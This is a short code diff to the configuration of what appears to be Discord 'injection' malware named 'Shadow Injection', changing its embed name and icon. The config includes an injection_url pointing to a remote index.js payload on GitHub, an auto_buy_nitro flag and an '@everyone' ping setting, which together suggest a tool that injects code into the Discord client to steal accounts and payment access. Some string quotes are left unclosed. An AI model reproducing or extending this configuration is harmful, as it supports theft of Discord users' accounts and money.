@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Shadow Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1138198116311498785/1148013072519282748/a_2105971a63ceabfd0fe61a818d1f22cc.gif, 
+  embed_name: 'SHADOW Injection',
+ embed_icon: 'https://cdn.discordapp.com/attachments/1138198116311498785/1148977555421007973/11111.gif'),
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/Hassantk343/injection/main/index.js, 
   /**
